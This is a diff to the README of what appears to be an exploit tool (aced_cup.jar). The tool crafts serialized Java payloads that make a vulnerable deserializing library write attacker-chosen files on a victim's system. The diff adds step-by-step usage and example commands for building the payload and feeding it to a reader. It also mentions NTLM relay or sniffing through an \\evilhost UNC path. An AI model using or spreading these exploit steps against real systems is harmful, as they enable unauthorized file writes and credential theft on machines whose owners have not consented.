@@ -11,14 +11,22 @@ Also we can perform a NTLM-relay/sniffing attack (using \\\\evilhost\\any\\path)
 
 ## Usage
 ```
+  1)
+  At first, we create a serialized payload:
   java -jar aced_cup.jar /path/payload /path/target /path/out 1
   
   /path/payload - a path to a file with your payload
-  /path/target - a path to a file that will be created in your victim
+  /path/target - a path to a file that will be created in your victim (this will be stored in the serialized payload)
   /path/out - a path to a file with serialized payload
   0 - turn off null-byte ending if you attack a patched system (with null by default)
+
+  2)
+  Then we set the serialized payload to a serialized reader:
+  java -jar ser_reader serialized_payload.txt
+  ser_reader tries to deserialize the payload and because of a vulnerability in it's library, it creates a new file in the directory specified.
+
 ```
 ## Example
 
- ```java -jar aced_cup.jar D:\\cup_exploit\\payload.txt /home/user/test/any_name.txt D:\\cup_exploit\\emp1.ser```
-
+ ```java -jar aced_cup.jar D:\\cup_exploit\\payload.txt /home/user/test/any_name.txt D:\\cup_exploit\\serialized_payload.txt```
+ ```java -jar ser_reader D:\\cup_exploit\\serialized_payload.txt````
